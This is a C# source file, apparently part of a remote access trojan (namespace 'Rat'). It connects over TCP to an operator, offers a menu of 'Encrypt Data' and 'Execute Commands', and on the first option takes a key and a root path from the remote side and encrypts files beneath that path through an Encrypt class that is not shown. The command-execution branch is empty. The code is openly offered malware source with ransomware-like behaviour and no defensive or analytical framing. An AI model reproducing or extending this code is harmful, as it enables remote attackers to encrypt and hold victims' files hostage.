using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Text;

namespace Rat
{
    class Program
    {
        private readonly List<Socket> connections;
        private readonly IPEndPoint _ipe;

        public Socket CurrenteConnection { get; private set; }
        public List<Socket> Connections => connections;
        public IPEndPoint IPEndPoint => _ipe;

        public Program(byte[] ip, int port)
        {
            _ipe = new IPEndPoint(new IPAddress(ip), port);
            connections = new List<Socket>();
            CurrenteConnection = null;
        }

        public void CreateNewConnection()
        {
            CurrenteConnection = new Socket(_ipe.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
            connections.Add(CurrenteConnection);
        }

        public void Connect()
        {
            CurrenteConnection.Connect(_ipe);
        }

        public void SendMessage(string message)
        {
            byte[] sentMessage = Encoding.ASCII.GetBytes(message);
            CurrenteConnection.Send(sentMessage, sentMessage.Length, 0);
        }
        public string ReceiveReponse()
        {
            Byte[] receiveMessage = new Byte[256];

            int bytes = 0;
            string response = "";
            bytes = CurrenteConnection.Receive(receiveMessage, receiveMessage.Length, 0);
            response += Encoding.ASCII.GetString(receiveMessage, 0, bytes);

            return response.Remove(response.Length - 1);
        }
        public static string ObtainMainMenu()
        {
            return "Chose one of the following:\n\n" +
                "1 - Encrypt Data\n" +
                "2 - Execute Commands\n";
        }

        static void Main(string[] args)
        {
            Program p = new Program(new byte[] { 127, 0, 0, 1 }, 99);
            p.CreateNewConnection();
            p.Connect();
            string response;
            do
            {
                int option;
                do
                {
                    p.SendMessage(ObtainMainMenu());
                    response = p.ReceiveReponse();
                    int.TryParse(response, out option);
                } while (option < 1 || option > 2);

                switch (option)
                {
                    case 1:
                        p.SendMessage("Type the encryption key that is going to be used:");
                        string key = p.ReceiveReponse();
                        p.SendMessage("Type the root path to start the encryption:");
                        string path = p.ReceiveReponse();

                        Encrypt e = new Encrypt(key, path, false);
                        e.EncryptFiles(p.SendMessage);
                        break;
                    case 2:
                        break;
                    default:
                        break;
                }
            } while (response != "exit");
            
        }
    }
}
